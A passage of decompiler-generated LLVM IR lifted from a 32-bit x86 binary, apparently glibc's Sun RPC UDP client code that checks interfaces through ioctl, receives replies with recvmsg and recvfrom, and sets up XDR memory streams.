  store i32 %v3_8055cd9, i32* %eax.global-to-local, align 4
  %v1_8055ce1 = icmp eq i32 %v3_8055cd9, 0
  %v1_8055ce3 = icmp eq i1 %v1_8055ce1, false
  br i1 %v1_8055ce3, label %dec_label_pc_8055f36, label %dec_label_pc_8055ce9

dec_label_pc_8055ce9:                             ; preds = %dec_label_pc_8055cb1
  %v0_8055cde = load i32, i32* @esp, align 4
  %v1_8055cde = add i32 %v0_8055cde, 16
  %v3_8055ce9 = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_8055e1e, i32* %edx.global-to-local, align 4
  %v2_8055cef = udiv i32 %v3_8055ce9, 32
  %tmp192 = icmp ult i32 %v3_8055ce9, 32
  store i32 %v2_8055cef, i32* @edi, align 4
  %tmp128152 = icmp eq i1 %tmp192, false
  br i1 %tmp128152, label %dec_label_pc_8055cfa, label %dec_label_pc_8055f36

dec_label_pc_8055cfa:                             ; preds = %dec_label_pc_8055ce9, %dec_label_pc_8055d3e
  %stack_var_-9016.3155 = phi i32 [ %v4_8055d3e, %dec_label_pc_8055d3e ], [ %v2_8055e1e, %dec_label_pc_8055ce9 ]
  %v0_8055cfa154 = phi i32 [ %v3_8055d1b, %dec_label_pc_8055d3e ], [ %v3_8055cd9, %dec_label_pc_8055ce9 ]
  %v1_8055cfa153 = phi i32 [ %v1_8055d20, %dec_label_pc_8055d3e ], [ %v1_8055cde, %dec_label_pc_8055ce9 ]
  %v2_8055cfa = add i32 %v1_8055cfa153, -4
  %v3_8055cfa = inttoptr i32 %v2_8055cfa to i32*
  store i32 %v0_8055cfa154, i32* %v3_8055cfa, align 4
  %v1_8055cfb = add i32 %v1_8055cfa153, -8
  %v2_8055cfb = inttoptr i32 %v1_8055cfb to i32*
  store i32 32, i32* %v2_8055cfb, align 4
  %v5_8055cfd = add i32 %v1_8055cfa153, -12
  %v6_8055cfd = inttoptr i32 %v5_8055cfd to i32*
  store i32 %stack_var_-9016.3155, i32* %v6_8055cfd, align 4
  store i32 %v2_8055d03, i32* @ebx, align 4
  %v2_8055d06 = add i32 %v1_8055cfa153, -16
  %v3_8055d06 = inttoptr i32 %v2_8055d06 to i32*
  store i32 %v2_8055d03, i32* %v3_8055d06, align 4
  %v3_8055d07 = inttoptr i32 %stack_var_-9016.3155 to i16*
  %v4_8055d07 = call i32 @memcpy(i16* %v3_8055d07, i32 %v0_8055cbb, i32 %stack_var_-9008.2)
  store i32 %v4_8055d07, i32* %eax.global-to-local, align 4
  %v0_8055d0c = load i32, i32* @esp, align 4
  %v2_8055d0f = add i32 %v0_8055d0c, 8
  %v3_8055d0f = inttoptr i32 %v2_8055d0f to i32*
  store i32 %v2_8055d03, i32* %v3_8055d0f, align 4
  %v1_8055d10 = add i32 %v0_8055d0c, 4
  %v2_8055d10 = inttoptr i32 %v1_8055d10 to i32*
  store i32 35091, i32* %v2_8055d10, align 4
  %v6_8055d15 = inttoptr i32 %v0_8055d0c to i32*
  store i32 %v0_8055cbb, i32* %v6_8055d15, align 4
  %v3_8055d1b = call i32 @ioctl(i32 %stack_var_-9016.3155, i32 %v0_8055cbb, i32 %stack_var_-9008.2)
  store i32 %v3_8055d1b, i32* %eax.global-to-local, align 4
  %v0_8055d20 = load i32, i32* @esp, align 4
  %v1_8055d20 = add i32 %v0_8055d20, 16
  %v2_8055d23 = icmp slt i32 %v3_8055d1b, 0
  br i1 %v2_8055d23, label %dec_label_pc_8055f36, label %dec_label_pc_8055d2b

dec_label_pc_8055d2b:                             ; preds = %dec_label_pc_8055cfa
  br i1 %v5_8055d2b, label %dec_label_pc_8055d3e, label %dec_label_pc_8055d31

dec_label_pc_8055d31:                             ; preds = %dec_label_pc_8055d2b
  store i32 %stack_var_-9016.3155, i32* %ecx.global-to-local, align 4
  %v1_8055d37 = add i32 %stack_var_-9016.3155, 16
  %v2_8055d37 = inttoptr i32 %v1_8055d37 to i16*
  %v3_8055d37 = load i16, i16* %v2_8055d37, align 4
  %v12_8055d37 = icmp eq i16 %v3_8055d37, 2
  br i1 %v12_8055d37, label %dec_label_pc_8055d4f, label %dec_label_pc_8055d3e

dec_label_pc_8055d3e:                             ; preds = %dec_label_pc_8055d31, %dec_label_pc_8055d2b
  %v4_8055d3e = add i32 %stack_var_-9016.3155, 32
  %v0_8055d45 = load i32, i32* @edi, align 4
  %v1_8055d45 = add i32 %v0_8055d45, -1
  store i32 %v1_8055d45, i32* @edi, align 4
  %tmp127 = icmp slt i32 %v1_8055d45, 1
  %tmp128 = icmp eq i1 %tmp127, false
  br i1 %tmp128, label %dec_label_pc_8055cfa, label %dec_label_pc_8055f36

dec_label_pc_8055d4f:                             ; preds = %dec_label_pc_8055d31
  %v0_8055d4f = load i32, i32* @esi, align 4
  %v1_8055d4f = add i32 %v0_8055d4f, 28
  %v2_8055d4f = inttoptr i32 %v1_8055d4f to i32*
  %v3_8055d4f = load i32, i32* %v2_8055d4f, align 4
  store i32 %v3_8055d4f, i32* @ebx, align 4
  %v5_8055d52 = add i32 %v3_8055d4f, %stack_var_-9004.2
  %v1_8055d58 = add i32 %v0_8055d4f, 32
  %v2_8055d58 = inttoptr i32 %v1_8055d58 to i32*
  %v3_8055d58 = load i32, i32* %v2_8055d58, align 4
  store i32 %v3_8055d58, i32* %eax.global-to-local, align 4
  %v5_8055d5b = add i32 %v3_8055d58, %stack_var_-9008.2
  %v4_8055d73156 = add i32 %v5_8055d5b, -999999
  %v9_8055d73157 = sub i32 999998, %v5_8055d5b
  %v10_8055d73158 = and i32 %v9_8055d73157, %v5_8055d5b
  %v11_8055d73159 = icmp slt i32 %v10_8055d73158, 0
  %v12_8055d73160 = icmp eq i32 %v4_8055d73156, 0
  %v13_8055d73161 = icmp slt i32 %v4_8055d73156, 0
  %v3_8055d7d162 = icmp eq i1 %v13_8055d73161, %v11_8055d73159
  %v4_8055d7d163 = icmp eq i1 %v12_8055d73160, false
  %v5_8055d7d164 = and i1 %v4_8055d7d163, %v3_8055d7d162
  br i1 %v5_8055d7d164, label %dec_label_pc_8055d63, label %dec_label_pc_8055d7f

dec_label_pc_8055d63:                             ; preds = %dec_label_pc_8055d4f, %dec_label_pc_8055d63
  %stack_var_-9004.3166 = phi i32 [ %v4_8055d63, %dec_label_pc_8055d63 ], [ %v5_8055d52, %dec_label_pc_8055d4f ]
  %storemerge7.in165 = phi i32 [ %v4_8055d69, %dec_label_pc_8055d63 ], [ %v5_8055d5b, %dec_label_pc_8055d4f ]
  %v4_8055d63 = add i32 %stack_var_-9004.3166, 1
  %v4_8055d69 = add i32 %storemerge7.in165, -1000000
  %v4_8055d73 = add i32 %storemerge7.in165, -1999999
  %v9_8055d73 = sub i32 1999998, %storemerge7.in165
  %v10_8055d73 = and i32 %v9_8055d73, %v4_8055d69
  %v11_8055d73 = icmp slt i32 %v10_8055d73, 0
  %v12_8055d73 = icmp eq i32 %v4_8055d73, 0
  %v13_8055d73 = icmp slt i32 %v4_8055d73, 0
  %v3_8055d7d = icmp eq i1 %v13_8055d73, %v11_8055d73
  %v4_8055d7d = icmp eq i1 %v12_8055d73, false
  %v5_8055d7d = and i1 %v4_8055d7d, %v3_8055d7d
  br i1 %v5_8055d7d, label %dec_label_pc_8055d63, label %dec_label_pc_8055d7f

dec_label_pc_8055d7f:                             ; preds = %dec_label_pc_8055d63, %dec_label_pc_8055d4f
  %storemerge7.in.lcssa = phi i32 [ %v5_8055d5b, %dec_label_pc_8055d4f ], [ %v4_8055d69, %dec_label_pc_8055d63 ]
  %stack_var_-9004.3.lcssa = phi i32 [ %v5_8055d52, %dec_label_pc_8055d4f ], [ %v4_8055d63, %dec_label_pc_8055d63 ]
  store i32 %storemerge3, i32* %edx.global-to-local, align 4
  %v5_8055d8b = icmp slt i32 %stack_var_-9004.3.lcssa, %storemerge3
  br i1 %v5_8055d8b, label %dec_label_pc_8055c17, label %dec_label_pc_8055d91

dec_label_pc_8055d91:                             ; preds = %dec_label_pc_8055d7f
  %v15_8055d85 = icmp eq i32 %stack_var_-9004.3.lcssa, %storemerge3
  %v1_8055d91 = icmp eq i1 %v15_8055d85, false
  br i1 %v1_8055d91, label %dec_label_pc_8055da5, label %dec_label_pc_8055d93

dec_label_pc_8055d93:                             ; preds = %dec_label_pc_8055d91
  store i32 %stack_var_-9000.0, i32* %ecx.global-to-local, align 4
  %v5_8055d9f = icmp slt i32 %storemerge7.in.lcssa, %stack_var_-9000.0
  br i1 %v5_8055d9f, label %dec_label_pc_8055c17, label %dec_label_pc_8055da5

dec_label_pc_8055da5:                             ; preds = %dec_label_pc_8055d93, %dec_label_pc_8055d91, %dec_label_pc_8055c4a.dec_label_pc_8055da5_crit_edge
  %v0_8055daa = phi i32 [ %v0_8055daa.pre, %dec_label_pc_8055c4a.dec_label_pc_8055da5_crit_edge ], [ %v0_8055d4f, %dec_label_pc_8055d91 ], [ %v0_8055d4f, %dec_label_pc_8055d93 ]
  store i32 5, i32* %eax.global-to-local, align 4
  %v1_8055daa = add i32 %v0_8055daa, 44
  %v2_8055daa = inttoptr i32 %v1_8055daa to i32*
  store i32 5, i32* %v2_8055daa, align 4
  br label %dec_label_pc_8056021

dec_label_pc_8055db6:                             ; preds = %dec_label_pc_8055c8b
  %v1_8055db6 = call i32 @__errno_location(i32 %stack_var_-9008.2)
  store i32 %v1_8055db6, i32* %eax.global-to-local, align 4
  %v1_8055dbb = inttoptr i32 %v1_8055db6 to i32*
  %v2_8055dbb = load i32, i32* %v1_8055dbb, align 4
  store i32 %v2_8055dbb, i32* %eax.global-to-local, align 4
  %v1_8055dbd = add i32 %v2_8055dbb, -4
  br label %dec_label_pc_8055f2d

dec_label_pc_8055dc5:                             ; preds = %dec_label_pc_8055ca9
  br i1 %v5_8055dc5, label %dec_label_pc_8055eef, label %dec_label_pc_8055dcf

dec_label_pc_8055dcf:                             ; preds = %dec_label_pc_8055dc5
  store i32 %stack_var_-9028.2, i32* @ebx, align 4
  %v2_8055df7 = sub i32 %v1_8055c9d, %v1_8055df4
  %v1_8055dfc = add i32 %v2_8055df7, 15
  store i32 %v2_8055df9, i32* %stack_var_-8980, align 4
  %v1_8055e09 = and i32 %v1_8055dfc, -16
  store i32 %v1_8055e09, i32* %edx.global-to-local, align 4
  %v1_8055e12 = add i32 %v1_8055e09, 256
  store i32 %v1_8055e12, i32* @edi, align 4
  %v2_8055e18 = add i32 %v2_8055df7, -4
  %v3_8055e18 = inttoptr i32 %v2_8055e18 to i32*
  store i32 %v2_8055e06, i32* %v3_8055e18, align 4
  %v1_8055e19 = add i32 %v2_8055df7, -8
  %v2_8055e19 = inttoptr i32 %v1_8055e19 to i32*
  store i32 8192, i32* %v2_8055e19, align 4
  store i32 %v2_8055e1e, i32* %eax.global-to-local, align 4
  %v2_8055e27 = add i32 %v2_8055df7, -12
  %v3_8055e27 = inttoptr i32 %v2_8055e27 to i32*
  store i32 %v2_8055e1e, i32* %v3_8055e27, align 4
  %v0_8055e28 = load i32, i32* @edi, align 4
  store i32 %v0_8055e28, i32* %stack_var_-36, align 4
  %v0_8055e35 = load i32, i32* %edx.global-to-local, align 4
  %v0_8055e45 = load i32, i32* @esi, align 4
  %v1_8055e45 = inttoptr i32 %v0_8055e45 to i32*
  %v2_8055e45 = load i32, i32* %v1_8055e45, align 4
  %v4_8055e45 = add i32 %v2_8055df7, -16
  %v5_8055e45 = inttoptr i32 %v4_8055e45 to i32*
  store i32 %v2_8055e45, i32* %v5_8055e45, align 4
  %v0_8055e47 = load i32, i32* %stack_var_-8980, align 4
  %v3_8055e47 = call i32 @__libc_recvmsg(i32 %v0_8055e47, i32 16, i32 %v2_8055e06)
  store i32 %v3_8055e47, i32* %eax.global-to-local, align 4
  %v0_8055e4c = load i32, i32* @esp, align 4
  %v1_8055e4c = add i32 %v0_8055e4c, 16
  %v2_8055e4f = icmp slt i32 %v3_8055e47, 0
  store i32 %v3_8055e47, i32* @ebx, align 4
  br i1 %v2_8055e4f, label %dec_label_pc_8055eef, label %dec_label_pc_8055e59

dec_label_pc_8055e59:                             ; preds = %dec_label_pc_8055dcf
  %v2_8055e59 = add i32 %v0_8055e4c, 12
  %v3_8055e59 = inttoptr i32 %v2_8055e59 to i32*
  store i32 %v3_8055e47, i32* %v3_8055e59, align 4
  %v0_8055e5a = load i32, i32* @ebx, align 4
  %v2_8055e5a = add i32 %v0_8055e4c, 8
  %v3_8055e5a = inttoptr i32 %v2_8055e5a to i32*
  store i32 %v0_8055e5a, i32* %v3_8055e5a, align 4
  %v0_8055e5b = load i32, i32* @esi, align 4
  %v1_8055e5b = add i32 %v0_8055e5b, 88
  %v2_8055e5b = inttoptr i32 %v1_8055e5b to i32*
  %v3_8055e5b = load i32, i32* %v2_8055e5b, align 4
  %v5_8055e5b = add i32 %v0_8055e4c, 4
  %v6_8055e5b = inttoptr i32 %v5_8055e5b to i32*
  store i32 %v3_8055e5b, i32* %v6_8055e5b, align 4
  %v0_8055e5e = load i32, i32* @edi, align 4
  %v3_8055e5e = inttoptr i32 %v0_8055e4c to i32*
  store i32 %v0_8055e5e, i32* %v3_8055e5e, align 4
  %v0_8055e5f = call i32 @bcmp()
  store i32 %v0_8055e5f, i32* %eax.global-to-local, align 4
  %v0_8055e64 = load i32, i32* @esp, align 4
  %v1_8055e64 = add i32 %v0_8055e64, 16
  %v1_8055e67 = icmp eq i32 %v0_8055e5f, 0
  %v1_8055e69 = icmp eq i1 %v1_8055e67, false
  br i1 %v1_8055e69, label %dec_label_pc_8055eef, label %dec_label_pc_8055e6f

dec_label_pc_8055e6f:                             ; preds = %dec_label_pc_8055e59
  br i1 %v5_8055e6f, label %dec_label_pc_8055eef, label %dec_label_pc_8055e78

dec_label_pc_8055e78:                             ; preds = %dec_label_pc_8055e6f
  store i32 16, i32* %eax.global-to-local, align 4
  %v3_8055e8e = load i16, i16* %stack_var_-76, align 2
  %v14_8055e8e = icmp eq i16 %v3_8055e8e, 2
  %v1_8055e93 = icmp eq i1 %v14_8055e8e, false
  br i1 %v1_8055e93, label %dec_label_pc_8055eef, label %dec_label_pc_8055e95

dec_label_pc_8055e95:                             ; preds = %dec_label_pc_8055e78
  %v0_8055e95 = load i32, i32* @ecx, align 4
  %v2_8055e95 = add i32 %v0_8055e64, 12
  %v3_8055e95 = inttoptr i32 %v2_8055e95 to i32*
  store i32 %v0_8055e95, i32* %v3_8055e95, align 4
  %v1_8055e96 = add i32 %v0_8055e64, 8
  %v2_8055e96 = inttoptr i32 %v1_8055e96 to i32*
  store i32 4, i32* %v2_8055e96, align 4
  %v0_8055e98 = load i32, i32* @esi, align 4
  %v1_8055e98 = add i32 %v0_8055e98, 12
  %v2_8055e9b = add i32 %v0_8055e64, 4
  %v3_8055e9b = inttoptr i32 %v2_8055e9b to i32*
  store i32 %v1_8055e98, i32* %v3_8055e9b, align 4
  store i32 %v2_8055e9c, i32* %eax.global-to-local, align 4
  %v3_8055e9f = inttoptr i32 %v0_8055e64 to i32*
  store i32 %v2_8055e9c, i32* %v3_8055e9f, align 4
  %v0_8055ea0 = call i32 @bcmp()
  store i32 %v0_8055ea0, i32* %eax.global-to-local, align 4
  %v0_8055ea5 = load i32, i32* @esp, align 4
  %v1_8055ea5 = add i32 %v0_8055ea5, 16
  %v1_8055ea8 = icmp eq i32 %v0_8055ea0, 0
  %v1_8055eaa = icmp eq i1 %v1_8055ea8, false
  br i1 %v1_8055eaa, label %dec_label_pc_8055eef, label %dec_label_pc_8055eac

dec_label_pc_8055eac:                             ; preds = %dec_label_pc_8055e95
  %v6_8055eac = and i32 %v0_8055ea0, -65536
  %v7_8055eac = or i32 %v6_8055eac, %v4_8055eac
  store i32 %v7_8055eac, i32* %eax.global-to-local, align 4
  %v2_8055eb0 = load i32, i32* @esi, align 4
  %v3_8055eb0 = add i32 %v2_8055eb0, 10
  %v4_8055eb0 = inttoptr i32 %v3_8055eb0 to i16*
  %v5_8055eb0 = load i16, i16* %v4_8055eb0, align 2
  %v16_8055eb0 = icmp eq i16 %tmp75, %v5_8055eb0
  %v1_8055eb4 = icmp eq i1 %v16_8055eb0, false
  br i1 %v1_8055eb4, label %dec_label_pc_8055eef, label %dec_label_pc_8055eb6

dec_label_pc_8055eb6:                             ; preds = %dec_label_pc_8055eac
  store i32 %v0_8055e35, i32* %eax.global-to-local, align 4
  %v1_8055eeb34 = icmp eq i32 %v0_8055e35, 0
  %v1_8055eed41 = icmp eq i1 %v1_8055eeb34, false
  br i1 %v1_8055eed41, label %dec_label_pc_8055ec9, label %dec_label_pc_8055eef

dec_label_pc_8055ec9:                             ; preds = %dec_label_pc_8055eb6, %dec_label_pc_8055ed9
  %v1_8055ed9 = phi i32 [ %v1_8055ee8, %dec_label_pc_8055ed9 ], [ %v1_8055ea5, %dec_label_pc_8055eb6 ]
  %v0_8055b30 = phi i32 [ %v0_8055ee3, %dec_label_pc_8055ed9 ], [ %v0_8055e35, %dec_label_pc_8055eb6 ]
  %v1_8055ec9 = add i32 %v0_8055b30, 4
  %v2_8055ec9 = inttoptr i32 %v1_8055ec9 to i32*
  %v3_8055ec9 = load i32, i32* %v2_8055ec9, align 4
  %v4_8055ec9 = icmp eq i32 %v3_8055ec9, 0
  %v1_8055ecd = icmp eq i1 %v4_8055ec9, false
  br i1 %v1_8055ecd, label %dec_label_pc_8055ed9, label %dec_label_pc_8055ecf

dec_label_pc_8055ecf:                             ; preds = %dec_label_pc_8055ec9
  %v1_8055ecf = add i32 %v0_8055b30, 8
  %v2_8055ecf = inttoptr i32 %v1_8055ecf to i32*
  %v3_8055ecf = load i32, i32* %v2_8055ecf, align 4
  %v12_8055ecf = icmp eq i32 %v3_8055ecf, 11
  br i1 %v12_8055ecf, label %dec_label_pc_8055b30, label %dec_label_pc_8055ed9

dec_label_pc_8055ed9:                             ; preds = %dec_label_pc_8055ecf, %dec_label_pc_8055ec9
  %v0_8055ed9 = load i32, i32* @edx, align 4
  %v2_8055ed9 = add i32 %v1_8055ed9, -4
  %v3_8055ed9 = inttoptr i32 %v2_8055ed9 to i32*
  store i32 %v0_8055ed9, i32* %v3_8055ed9, align 4
  %v0_8055eda = load i32, i32* @edx, align 4
  %v2_8055eda = add i32 %v1_8055ed9, -8
  %v3_8055eda = inttoptr i32 %v2_8055eda to i32*
  store i32 %v0_8055eda, i32* %v3_8055eda, align 4
  %v0_8055edb = load i32, i32* %eax.global-to-local, align 4
  %v2_8055edb = add i32 %v1_8055ed9, -12
  %v3_8055edb = inttoptr i32 %v2_8055edb to i32*
  store i32 %v0_8055edb, i32* %v3_8055edb, align 4
  store i32 %v2_8055e1e, i32* %eax.global-to-local, align 4
  %v2_8055ee2 = add i32 %v1_8055ed9, -16
  %v3_8055ee2 = inttoptr i32 %v2_8055ee2 to i32*
  store i32 %v2_8055e1e, i32* %v3_8055ee2, align 4
  %v0_8055ee3 = call i32 @__cmsg_nxthdr()
  store i32 %v0_8055ee3, i32* %eax.global-to-local, align 4
  %v0_8055ee8 = load i32, i32* @esp, align 4
  %v1_8055ee8 = add i32 %v0_8055ee8, 16
  %v1_8055eeb = icmp eq i32 %v0_8055ee3, 0
  %v1_8055eed = icmp eq i1 %v1_8055eeb, false
  br i1 %v1_8055eed, label %dec_label_pc_8055ec9, label %dec_label_pc_8055eef

dec_label_pc_8055eef:                             ; preds = %dec_label_pc_8055eac, %dec_label_pc_8055e95, %dec_label_pc_8055e78, %dec_label_pc_8055e6f, %dec_label_pc_8055e59, %dec_label_pc_8055dcf, %dec_label_pc_8055dc5, %dec_label_pc_8055eb6, %dec_label_pc_8055ed9, %dec_label_pc_8055f19.dec_label_pc_8055eef_crit_edge
  %v1_8055eef = phi i32 [ %v1_8055eef.pre, %dec_label_pc_8055f19.dec_label_pc_8055eef_crit_edge ], [ %v1_8055ea5, %dec_label_pc_8055eb6 ], [ %v1_8055ea5, %dec_label_pc_8055eac ], [ %v1_8055ea5, %dec_label_pc_8055e95 ], [ %v1_8055e64, %dec_label_pc_8055e78 ], [ %v1_8055e64, %dec_label_pc_8055e6f ], [ %v1_8055e64, %dec_label_pc_8055e59 ], [ %v1_8055e4c, %dec_label_pc_8055dcf ], [ %v1_8055c9d, %dec_label_pc_8055dc5 ], [ %v1_8055ee8, %dec_label_pc_8055ed9 ]
  %v0_8055eef = phi i32 [ %v1_8055f19, %dec_label_pc_8055f19.dec_label_pc_8055eef_crit_edge ], [ %v0_8055e35, %dec_label_pc_8055eb6 ], [ %v7_8055eac, %dec_label_pc_8055eac ], [ %v0_8055ea0, %dec_label_pc_8055e95 ], [ 16, %dec_label_pc_8055e78 ], [ %v0_8055e5f, %dec_label_pc_8055e6f ], [ %v0_8055e5f, %dec_label_pc_8055e59 ], [ %v3_8055e47, %dec_label_pc_8055dcf ], [ %v0_8055c98, %dec_label_pc_8055dc5 ], [ %v0_8055ee3, %dec_label_pc_8055ed9 ]
  %v2_8055eef = add i32 %v1_8055eef, -4
  %v3_8055eef = inttoptr i32 %v2_8055eef to i32*
  store i32 %v0_8055eef, i32* %v3_8055eef, align 4
  %v0_8055ef0 = load i32, i32* %eax.global-to-local, align 4
  %v2_8055ef0 = add i32 %v1_8055eef, -8
  %v3_8055ef0 = inttoptr i32 %v2_8055ef0 to i32*
  store i32 %v0_8055ef0, i32* %v3_8055ef0, align 4
  store i32 %v2_8055ef1, i32* %eax.global-to-local, align 4
  %v2_8055ef4 = add i32 %v1_8055eef, -12
  %v3_8055ef4 = inttoptr i32 %v2_8055ef4 to i32*
  store i32 %v2_8055ef1, i32* %v3_8055ef4, align 4
  store i32 %v2_8055ef5, i32* %edx.global-to-local, align 4
  %v2_8055ef8 = add i32 %v1_8055eef, -16
  %v3_8055ef8 = inttoptr i32 %v2_8055ef8 to i32*
  store i32 %v2_8055ef5, i32* %v3_8055ef8, align 4
  %v1_8055ef9 = add i32 %v1_8055eef, -20
  %v2_8055ef9 = inttoptr i32 %v1_8055ef9 to i32*
  store i32 0, i32* %v2_8055ef9, align 4
  %v0_8055efb = load i32, i32* @esi, align 4
  %v1_8055efb = add i32 %v0_8055efb, 96
  store i32 %v1_8055efb, i32* @ebx, align 4
  store i32 16, i32* %stack_var_-20, align 4
  %v1_8055f05 = add i32 %v0_8055efb, 92
  %v2_8055f05 = inttoptr i32 %v1_8055f05 to i32*
  %v3_8055f05 = load i32, i32* %v2_8055f05, align 4
  %v5_8055f05 = add i32 %v1_8055eef, -24
  %v6_8055f05 = inttoptr i32 %v5_8055f05 to i32*
  store i32 %v3_8055f05, i32* %v6_8055f05, align 4
  %v0_8055f08 = load i32, i32* @ebx, align 4
  %v2_8055f08 = add i32 %v1_8055eef, -28
  %v3_8055f08 = inttoptr i32 %v2_8055f08 to i32*
  store i32 %v0_8055f08, i32* %v3_8055f08, align 4
  %v0_8055f09 = load i32, i32* @esi, align 4
  %v1_8055f09 = inttoptr i32 %v0_8055f09 to i32*
  %v2_8055f09 = load i32, i32* %v1_8055f09, align 4
  %v4_8055f09 = add i32 %v1_8055eef, -32
  %v5_8055f09 = inttoptr i32 %v4_8055f09 to i32*
  store i32 %v2_8055f09, i32* %v5_8055f09, align 4
  %v0_8055f0b = load i32, i32* %stack_var_-20, align 4
  %v4_8055f0b = load i32, i32* %stack_var_-4, align 4
  %v5_8055f0b = load i32, i32* %stack_var_0, align 4
  %v6_8055f0b = call i32 @__libc_recvfrom(i32 %v0_8055f0b, i32 %v0_8055ad7, i32 %v0_8055ad6, i32 %v0_8055ad5, i32 %v4_8055f0b, i32 %v5_8055f0b)
  store i32 %v6_8055f0b, i32* %eax.global-to-local, align 4
  %v0_8055f10 = load i32, i32* @esp, align 4
  %v1_8055f10 = add i32 %v0_8055f10, 32
  %v2_8055f13 = icmp slt i32 %v6_8055f0b, 0
  store i32 %v6_8055f0b, i32* @ecx, align 4
  %v1_8055f17 = icmp eq i1 %v2_8055f13, false
  br i1 %v1_8055f17, label %dec_label_pc_8055f47, label %dec_label_pc_8055f19

dec_label_pc_8055f19:                             ; preds = %dec_label_pc_8055eef
  %v0_8055f19 = load i32, i32* %stack_var_-20, align 4
  %v1_8055f19 = call i32 @__errno_location(i32 %v0_8055f19)
  store i32 %v1_8055f19, i32* %eax.global-to-local, align 4
  %v1_8055f1e = inttoptr i32 %v1_8055f19 to i32*
  %v2_8055f1e = load i32, i32* %v1_8055f1e, align 4
  %v11_8055f1e = icmp eq i32 %v2_8055f1e, 4
  br i1 %v11_8055f1e, label %dec_label_pc_8055f19.dec_label_pc_8055eef_crit_edge, label %dec_label_pc_8055f23

dec_label_pc_8055f19.dec_label_pc_8055eef_crit_edge: ; preds = %dec_label_pc_8055f19
  %v1_8055eef.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8055eef

dec_label_pc_8055f23:                             ; preds = %dec_label_pc_8055f19
  %v0_8055f23 = load i32, i32* %stack_var_-20, align 4
  %v1_8055f23 = call i32 @__errno_location(i32 %v0_8055f23)
  store i32 %v1_8055f23, i32* %eax.global-to-local, align 4
  %v1_8055f28 = inttoptr i32 %v1_8055f23 to i32*
  %v2_8055f28 = load i32, i32* %v1_8055f28, align 4
  store i32 %v2_8055f28, i32* %eax.global-to-local, align 4
  %v1_8055f2a = add i32 %v2_8055f28, -11
  br label %dec_label_pc_8055f2d

dec_label_pc_8055f2d:                             ; preds = %dec_label_pc_8055db6, %dec_label_pc_8055f23
  %v0_8055f3372 = phi i32 [ %v2_8055dbb, %dec_label_pc_8055db6 ], [ %v2_8055f28, %dec_label_pc_8055f23 ]
  %storemerge8.in = phi i32 [ %v1_8055dbd, %dec_label_pc_8055db6 ], [ %v1_8055f2a, %dec_label_pc_8055f23 ]
  %storemerge8 = icmp eq i32 %storemerge8.in, 0
  br i1 %storemerge8, label %dec_label_pc_8055f2d.dec_label_pc_8055c8b.backedge_crit_edge, label %dec_label_pc_8055f33

dec_label_pc_8055f2d.dec_label_pc_8055c8b.backedge_crit_edge: ; preds = %dec_label_pc_8055f2d
  %v0_8055c8b.pre.pre = load i32, i32* @ecx, align 4
  %v1_8055c8b.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8055c8b

dec_label_pc_8055f33:                             ; preds = %dec_label_pc_8055f2d, %dec_label_pc_8055b30
  %v0_8055f33 = phi i32 [ %v3_8055b30, %dec_label_pc_8055b30 ], [ %v0_8055f3372, %dec_label_pc_8055f2d ]
  %v1_8055f33 = load i32, i32* @esi, align 4
  %v2_8055f33 = add i32 %v1_8055f33, 48
  %v3_8055f33 = inttoptr i32 %v2_8055f33 to i32*
  store i32 %v0_8055f33, i32* %v3_8055f33, align 4
  br label %dec_label_pc_8055f36

dec_label_pc_8055f36:                             ; preds = %dec_label_pc_8055cb1, %dec_label_pc_8055ce9, %dec_label_pc_8055cfa, %dec_label_pc_8055d3e, %dec_label_pc_8055f33
  store i32 4, i32* %eax.global-to-local, align 4
  %v0_8055f3b = load i32, i32* @esi, align 4
  %v1_8055f3b = add i32 %v0_8055f3b, 44
  %v2_8055f3b = inttoptr i32 %v1_8055f3b to i32*
  store i32 4, i32* %v2_8055f3b, align 4
  br label %dec_label_pc_8056021

dec_label_pc_8055f47:                             ; preds = %dec_label_pc_8055eef
  %v7_8055f4a = icmp sgt i32 %v6_8055f0b, 3
  br i1 %v7_8055f4a, label %dec_label_pc_8055f50, label %dec_label_pc_8055c8b

dec_label_pc_8055f50:                             ; preds = %dec_label_pc_8055f47
  br i1 %v4_8055b72, label %dec_label_pc_8055f64, label %dec_label_pc_8055f56

dec_label_pc_8055f56:                             ; preds = %dec_label_pc_8055f50
  %v0_8055f56 = load i32, i32* @esi, align 4
  %v1_8055f56 = add i32 %v0_8055f56, 88
  %v2_8055f56 = inttoptr i32 %v1_8055f56 to i32*
  %v3_8055f56 = load i32, i32* %v2_8055f56, align 4
  store i32 %v3_8055f56, i32* %edx.global-to-local, align 4
  %v1_8055f59 = add i32 %v0_8055f56, 96
  %v2_8055f59 = inttoptr i32 %v1_8055f59 to i32*
  %v3_8055f59 = load i32, i32* %v2_8055f59, align 4
  store i32 %v3_8055f59, i32* %eax.global-to-local, align 4
  %v2_8055f5c = inttoptr i32 %v3_8055f56 to i32*
  %v3_8055f5c = load i32, i32* %v2_8055f5c, align 4
  %v14_8055f5c = icmp eq i32 %v3_8055f59, %v3_8055f5c
  %v1_8055f5e = icmp eq i1 %v14_8055f5c, false
  br i1 %v1_8055f5e, label %dec_label_pc_8055c8b, label %dec_label_pc_8055f64

dec_label_pc_8055f64:                             ; preds = %dec_label_pc_8055f56, %dec_label_pc_8055f50
  %v1_8055f64 = add i32 %v0_8055f10, 28
  %v2_8055f64 = inttoptr i32 %v1_8055f64 to i32*
  store i32 1, i32* %v2_8055f64, align 4
  %v0_8055f66 = load i32, i32* @ecx, align 4
  %v2_8055f66 = add i32 %v0_8055f10, 24
  %v3_8055f66 = inttoptr i32 %v2_8055f66 to i32*
  store i32 %v0_8055f66, i32* %v3_8055f66, align 4
  %v0_8055f67 = load i32, i32* @ebx, align 4
  %v2_8055f67 = add i32 %v0_8055f10, 20
  %v3_8055f67 = inttoptr i32 %v2_8055f67 to i32*
  store i32 %v0_8055f67, i32* %v3_8055f67, align 4
  store i32 %v2_8055f68, i32* @ebx, align 4
  %v2_8055f6b = add i32 %v0_8055f10, 16
  %v3_8055f6b = inttoptr i32 %v2_8055f6b to i32*
  store i32 %v2_8055f68, i32* %v3_8055f6b, align 4
  %v0_8055f6c = load i32, i32* %stack_var_-20, align 4
  %v4_8055f6c = inttoptr i32 %v0_8055f6c to i32*
  %v5_8055f6c = call i32 @__GI_xdrmem_create(i32* %v4_8055f6c, i32 %v0_8055ad7, i32 %v0_8055ad6, i32 %v0_8055ad5)
  store i32 %v5_8055f6c, i32* %eax.global-to-local, align 4
  %v0_8055f71 = load i32, i32* @esp, align 4
